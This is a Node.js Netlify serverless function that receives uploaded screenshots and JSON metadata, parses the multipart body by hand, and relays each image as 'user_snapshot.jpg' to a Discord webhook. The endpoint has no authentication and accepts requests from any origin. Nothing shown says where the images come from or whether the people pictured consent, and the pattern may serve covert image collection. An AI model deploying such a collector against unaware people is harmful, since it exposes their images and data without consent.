// netlify/capture.js
// Netlify Serverless Function to receive screenshots

const crypto = require('crypto');

exports.handler = async (event) => {
  // Handle CORS preflight
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
      },
      body: ''
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Only POST allowed' })
    };
  }

  try {
    // Netlify provides the body as a base64 encoded string if isBase64Encoded is true
    // Or as a raw string. We need to decode it to parse multipart/form-data.
    
    const body = event.body;
    const contentType = event.headers['content-type'] || event.headers['Content-Type'];

    if (!contentType || !contentType.includes('multipart/form-data')) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Expected multipart/form-data' })
      };
    };

    // Parse the boundary from the content-type
    const boundaryMatch = contentType.match(/boundary=(?:"([^"]+)"|([^;]+))/);
    if (!boundaryMatch) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'No boundary found' })
      };
    }
    const boundary = boundaryMatch[1] || boundaryMatch[2];

    // Decode the body
    let buffer;
    if (event.isBase64Encoded) {
      buffer = Buffer.from(body, 'base64');
    } else {
      buffer = Buffer.from(body, 'binary');
    }

    // Simple Multipart Parser
    // This is a lightweight parser for our specific use case (one file, one text field)
    const parts = buffer.toString('binary').split(`--${boundary}`);
    let screenshotBuffer = null;
    let metadata = null;

    for (let part of parts) {
      if (part.includes('name="screenshot"')) {
        // Extract the file content
        const headerEnd = part.indexOf('\r\n\r\n');
        if (headerEnd !== -1) {
          // The file data starts after the headers
          let fileData = part.substring(headerEnd + 4);
          // Remove the trailing \r\n that belongs to the boundary
          if (fileData.endsWith('\r\n')) {
            fileData = fileData.substring(0, fileData.length - 2);
          }
          screenshotBuffer = Buffer.from(fileData, 'binary');
        }
      } else if (part.includes('name="metadata"')) {
        // Extract metadata
        const headerEnd = part.indexOf('\r\n\r\n');
        if (headerEnd !== -1) {
          let metaData = part.substring(headerEnd + 4);
          if (metaData.endsWith('\r\n')) {
            metaData = metaData.substring(0, metaData.length - 2);
          }
          metadata = JSON.parse(metaData);
        }
      }
    }

    if (!screenshotBuffer) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'No screenshot file found' })
      };
    }

    // Log to Netlify Console
    console.log('--- NEW SNAPSHOT RECEIVED ---');
    console.log('Metadata:', metadata);
    console.log('File Size (KB):', (screenshotBuffer.length / 1024).toFixed(2));

    // Send to Discord Webhook (Optional but Recommended)
    const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

    if (DISCORD_WEBHOOK_URL) {
      const formData = new FormData();
      formData.append('files[0]', new Blob([screenshotBuffer], { type: 'image/jpeg' }), 'user_snapshot.jpg');
      formData.append('content', `**New Snapshot Received!**\n\n\`\`\`json\n${JSON.stringify(metadata, null, 2)}\n\`\`\``);

      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        body: formData
      });
    } else {
      console.warn('DISCORD_WEBHOOK_URL not set. Data logged to console only.');
    }

    // Return success
    return {
      statusCode: 200,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: JSON.stringify({ status: 'success', message: 'Snapshot received' })
    };

  } catch (error) {
    console.error('Error processing request:', error);
    return {
      statusCode: 500,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: JSON.stringify({ status: 'error', message: error.message })
    };
  }
};
